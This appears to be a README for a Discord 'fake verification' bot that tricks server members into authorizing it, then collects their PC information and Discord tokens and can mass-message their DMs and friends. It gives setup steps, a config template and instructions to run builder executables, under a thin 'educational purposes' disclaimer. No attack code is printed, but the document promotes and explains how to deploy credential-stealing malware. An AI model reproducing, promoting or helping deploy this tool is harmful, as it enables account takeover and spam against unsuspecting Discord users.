# Force-AuthorizationAppsGrabber
Discord Bot Authorization Apps that Grabs everything on Pc Including Discord Tokens

( If You Install the .bat file it will sometimes Crash. It's not something that happens Rare 
it's a Command that's why! If you .bat doesn't install then install the .exe )
~ Update .bat file deleted due to its rapidly crash!

Discord Official Server : https://discord.gg/VMsgKYRYxM

<h1 align="center">[Discord] - Fake Authorization Apps Verification Bot (V1.0.0)

<a href="https://jon.cab">ADD VERIFICATION BOT TO YOUR SERVER (ONLINE 24/24)</a>
</h1></h1>

<p align="center">
  [Discord] - This Bot is a Script Gathering for Windows systems written in Python.
</p>
<p align="center">
  This Bot allows to create a Authorization Apps, that the user will have to verify on his arrival on the server. Once verified, you will get his information including his Token.
</p>


## Disclaimer

|Bot was made for Educational purposes|
|-------------------------------------------------|
This project was created only for good purposes and personal use.
By using this Bot, you agree that you hold responsibility and accountability of any consequences caused by your actions.

## Features

- Async Authorization Apps Management
- Using Websockets (no browser used)
- Saves the information in a json file
- Can gives a role to the user after his verification
- Can send a message to all the user's DMs + all user's Friend
- Possibility to define a logs channel
- Easy to use + Intuitive UI ([SelfBot](https://example.com)

## How To Setup/Install

#### First of all please set your informations in the config.json file!
```json
{
    "botToken": "BOT-TOKEN-HERE", #For more information, read below
    "logs_channel_id": "LOGS-CHANNEL-ID-HERE", #ID of the channel to which the bot logs will be sent
    
    "prefix": "PREFIX-HERE",
    "command_name": "COMMAND-NAME-HERE",
    
    "give_role": false, #Can take the value: true or false
    "role_name": "ROLE-NAME-HERE", #Name of the role you want to give to the user after verifying with Authorization Apps 
    "mass_dm": 0, #Can take the value: 0 (Disable), 1 (current user's dms), 2 (user's friends), 3 (Current DMs + Friends)
    "message": "MESSAGE-HERE" #Message you want to send to all user's DMs after verifying with Authorization Apps
}
```
#### Set up and invite your Bot.
- Create a bot on the [Discord Developer page](https://discord.com/developers/applications)
- Enable all instances in the "Bot" tab
- Invite your bot using this [invite](https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=8&scope=applications.commands%20bot) (replace CLIENTID by the ID of your Bot)

#### 1st Option ・Installation
```
Launch the Bot_Builder.exe and Bot_BuilderIT.exe file. A new file will be created. You will only have to launch it. 
```

#### 2nd Option・Installation
```
Launch the Bot_Builder.py and Bot_BuilderIT.py file. A new file will be created. You will only have to launch it. 
```

( Bat Installation version is deleted due to its rapidly crashing)
